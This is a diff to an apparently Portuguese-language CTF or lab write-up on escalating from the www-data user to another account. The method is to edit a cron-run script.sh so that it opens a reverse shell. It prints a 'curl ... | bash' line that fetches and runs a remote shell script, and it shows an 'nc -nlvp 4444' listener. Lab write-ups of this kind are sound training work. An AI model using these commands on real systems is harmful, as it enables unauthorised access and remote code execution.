@@ -80,4 +80,16 @@ nc -nlvp 4444
   Para Conseguir entrar no user dele podemos usar o script que ele criou contra ele mesmo
   e colocar um shell reverse para entrar da nossa maquina no perfil de usuario dele
 
+
+  Conclusão: se para conseguir acesso precisamos de uma interação com o swagger e ocorre no arquivo
+  a cada um minuto como a analise do chat gpt disse.
+  então mudamos o conteudo o arquivo colocamos outro shel reverse de usuario agora
+  
+  1. colocar o comando do shell reverse já usado (exito) , dentro do script.sh
+  comando ( curl http://192.168.100.168:8000/shell_2.sh | bash )
+  2. executar enquanto o outro terminal escuta a shell
+  
+  
 ```
+![image](https://github.com/user-attachments/assets/b0322b76-b96a-4585-a5cf-a485ee1183bb)
+### por exemplo aqui se colocar-mos um bash dentro desse script.sh como nos colocamos com o usuario wwwdata , quando eu exe no arquivo vai me retornar como se fosse um shell reversa do propio usuario como na imagem acima
